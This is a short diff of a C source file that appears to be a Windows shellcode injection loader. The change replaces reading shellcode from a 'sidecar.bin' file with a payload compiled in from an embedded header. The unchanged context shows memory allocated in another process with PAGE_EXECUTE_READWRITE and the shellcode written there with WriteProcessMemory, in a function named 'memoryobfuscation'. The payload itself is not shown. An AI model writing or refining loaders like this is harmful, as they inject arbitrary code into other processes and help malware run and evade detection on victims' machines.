@@ -1,3 +1,4 @@
+#include "embedded_bin.h"
 #include <stdio.h>
 
 typedef struct {
@@ -71,26 +72,12 @@ void memoryobfuscation(){
         return 1;
     }
 
-    FILE* fp;
-    fopen_s(&fp, "sidecar.bin", "rb");
-    if (!fp) {
-        return 1;
-    }
-
-    fseek(fp, 0, SEEK_END);
-    size_t size = ftell(fp);
-    rewind(fp);
-
-    unsigned char* shellcode = (unsigned char*)malloc(size);
-    fread(shellcode, 1, size, fp);
-    fclose(fp);
-
     LPVOID remoteMem = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!remoteMem) {
         return 1;
     }
 
-    if (!WriteProcessMemory(pi.hProcess, remoteMem, shellcode, size, NULL)) {
+    if (!WriteProcessMemory(pi.hProcess, remoteMem, sidecar_bin, sidecar_bin_len, NULL)) {
         return 1;
     }
 
